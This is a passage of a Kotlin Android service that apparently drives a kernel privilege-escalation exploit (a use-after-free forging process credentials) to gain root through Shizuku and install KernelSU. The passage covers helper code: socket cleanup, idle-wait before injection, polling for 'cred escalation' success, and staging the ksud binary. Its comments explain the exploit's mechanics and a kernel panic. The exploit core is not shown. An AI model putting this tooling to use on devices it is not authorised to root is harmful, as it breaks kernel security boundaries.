            "<s> oom_score_adj(pid=$pid): write=" + (if (ok) "ok" else "denied") + ", now=$now",
        )
    }


    private fun readResult(workDir: File, name: String): String? {
        val f = File(workDir, name)
        if (!f.isFile) return null
        val v = runCatching { f.readText().trim() }.getOrNull() ?: return null
        return v.takeIf { HEX_RE.matches(it) }
    }

    /**
     * 只删 socket / stop 文件，**绝不对任何进程发信号**。
     *
     * 历史教训（真机 22:11 一轮，设备关机）：这里原来会扫 cmdline 含
     * libcve98260.so 的进程并 sendSignal(9)。注释当时写的是"对 uid 0 本身就是
     * EPERM，保留无害" —— 但上一轮的**父进程是 uid 2000**，与本服务同 uid，
     * SIGKILL 完全成功。而父进程正是钉住那批被 UAF 回收的页的进程：杀掉它，
     * 页被提前释放，仍持有伪造 cred 的进程（cred 子进程、经 rootd 拉起的 ksud）
     * 随后踩到悬空指针 → kernel panic → 设备重启。
     *
     * 残留进程现在由 runChain 的 [4] 前置检查处理：发现残留直接中止并提示重启。
     *
     * 返回删除失败的个数。此前用 `runCatching { delete() }` 吞掉了一切失败，于是
     * 日志里 "cleaning up stale sockets" 永远成立；真机 22:50 实测工作目录里积了
     * 14 个 `root-*.sock`，全都没被删掉 —— SELinux Enforcing 下 shell 域 unlink 一个
     * unlabeled socket 会被拒绝。删除失败本身无害（每轮 socket 名唯一，不会串轮），
     * 但日志不得谎报，故把失败数交给调用方上报。
     */
    private fun cleanupStale(workDir: File): Int {
        val targets = mutableListOf(File(ROOT_SOCK), File(workDir, "rootd.stop"))
        runCatching {
            workDir.listFiles()
                ?.filter {
                    it.name.startsWith("root-") &&
                        (it.name.endsWith(".sock") || it.name.endsWith(".stop"))
                }
                ?.let { targets.addAll(it) }
        }
        var failed = 0
        for (f in targets) {
            if (!runCatching { f.delete() }.getOrDefault(false)) failed++
        }
        return failed
    }

    /** 参考实现 run.py 的 wait_idle：runnable <= 10 才注入。 */
    private fun waitIdle() {
        val deadline = System.currentTimeMillis() + 24_000
        while (System.currentTimeMillis() < deadline) {
            val txt = runCatching { File("/proc/loadavg").readText() }.getOrNull() ?: return
            val fields = txt.trim().split(Regex("\\s+"))
            val runnable = fields.getOrNull(3)
                ?.let { Regex("(\\d+)/(\\d+)").find(it) }
                ?.groupValues?.get(1)?.toIntOrNull()
            if (runnable != null && runnable <= 10) return
            Thread.sleep(3000)
        }
    }

    private fun waitForRootd(logFile: File, timeoutMs: Long): Boolean {
        val deadline = System.currentTimeMillis() + timeoutMs
        while (System.currentTimeMillis() < deadline) {
            if (tailContains(logFile, ROOTD_MARKER)) return true
            if (tailContains(logFile, "cred escalation not effective") ||
                tailContains(logFile, "binding failed") ||
                tailContains(logFile, "listen failed")
            ) {
                return false
            }
            Thread.sleep(400)
        }
        return false
    }

    private fun tailContains(file: File, needle: String): Boolean {
        val len = file.length()
        if (len <= 0L) return false
        val from = (len - TAIL_SCAN_MAX).coerceAtLeast(0L)
        val n = (len - from).toInt()
        val buf = ByteArray(n)
        runCatching {
            RandomAccessFile(file, "r").use { h ->
                h.seek(from)
                var got = 0
                while (got < n) {
                    val r = h.read(buf, got, n - got)
                    if (r <= 0) break
                    got += r
                }
            }
        }.getOrElse { return false }
        return String(buf, Charsets.UTF_8).contains(needle)
    }

    private fun modulesHasKernelsu(): Boolean =
        runCatching {
            File("/proc/modules").readText().contains("kernelsu", ignoreCase = true)
        }.getOrDefault(false)

    /**
     * Stage the exact manager selected in the assistant workbench. Do not scan
     * installed packages here: a different KernelSU fork can otherwise win the
     * scan and silently replace the user's selection.
     */
    private fun resolveKsud(
        workDir: File,
        managerPackage: String,
        selectedPath: String,
        callback: ICve98260Callback?,
    ): File? {
        if (selectedPath.isNotBlank()) {
            val source = File(selectedPath)
            val staged = runCatching {
                require(source.isFile && source.canRead()) {
                    "selected manager ksud is not readable: ${source.absolutePath}"
                }
                val target = File(KsudStage.TARGET)
                source.copyTo(target, overwrite = true)
                require(target.length() > 0L) { "selected manager ksud is empty" }
                target.setExecutable(true, false)
                target
            }.getOrNull()
            if (staged != null) {
                callback?.onLog(
                    "<s> ksud staged from selected manager [$managerPackage]: " +
                        "${staged.absolutePath} (source=${source.absolutePath}, size=${staged.length()})",
                )
                return staged
            }
            callback?.onLog(
                "<s> warn: selected manager [$managerPackage] ksud path could not be staged; " +
                    "using bundled ksud rather than scanning other managers",
            )
        } else {
            callback?.onLog(
                "<s> selected manager [$managerPackage] has no ksud path; " +
                    "using bundled ksud rather than scanning other managers",
            )
        }

        return extractKsud(workDir)
    }

    /** 从 assets/ksu/ksud 解压可执行文件；不存在返回 null。 */
    private fun extractKsud(workDir: File): File? {
        return runCatching {
            val target = File(workDir, "ksud")
            if (!target.exists() || target.length() == 0L) {
                context.assets.open("ksu/ksud").use { input ->
                    target.outputStream().use { output -> input.copyTo(output) }
                }
            }
            target.setExecutable(true, false)
            if (target.length() > 0L) target else null
        }.getOrNull()
    }


    /**
     * 日志文件 tailer：把原生 stdout 逐行回传，状态行转 onProgress。
     * 按字节缓冲 + 整行 UTF-8 解码（原生日志含中文，逐字节转 Char 会乱码）。
     */
    private fun relayLog(logFile: File, callback: ICve98260Callback?) {
        var offset = 0L
        val carry = ByteArrayOutputStream()
        val buf = ByteArray(16384)

        fun emitLine(raw: ByteArray) {
            val line = String(raw, Charsets.UTF_8)
            if (line.isEmpty()) return
            if (line.startsWith(STATUS_MARKER)) {
                val parts = line.removePrefix(STATUS_MARKER).trim().split(' ')
                if (parts.size >= 2) callback?.onProgress(stageIndex(parts[0]), parts[1])
            } else {
                callback?.onLog(line)
            }
        }

        while (!Thread.currentThread().isInterrupted) {
            try {
                if (logFile.isFile) {
                    RandomAccessFile(logFile, "r").use { h ->
                        val len = h.length()
                        if (offset > len) {
                            offset = 0L
                            carry.reset()
                        }
                        if (len > offset) {
                            h.seek(offset)
                            var remaining = len - offset
                            while (remaining > 0) {
                                val want = minOf(buf.size.toLong(), remaining).toInt()
                                val n = h.read(buf, 0, want)
                                if (n <= 0) break
                                offset += n
                                remaining -= n
                                var start = 0
                                for (i in 0 until n) {
                                    if (buf[i] == '\n'.code.toByte()) {
                                        carry.write(buf, start, i - start)
                                        emitLine(carry.toByteArray())
                                        carry.reset()
                                        start = i + 1
                                    }
                                }
                                if (start < n) carry.write(buf, start, n - start)
                            }
                        }
                    }
                }
                Thread.sleep(120)
            } catch (_: InterruptedException) {
                Thread.currentThread().interrupt()
                return
            } catch (_: Exception) {
                runCatching { Thread.sleep(150) }
            }
        }
    }


    override fun getKernelRelease(): String =
        runCatching { System.getProperty("os.version") ?: "unknown" }.getOrDefault("unknown")

    override fun isShizukuReady(): Boolean = PrivilegeGate.checkService().ok

    override fun destroy() {
        if (!running.get()) {
            runCatching { exploitProcess?.destroy() }
            kotlin.system.exitProcess(0)
        }
    }
}
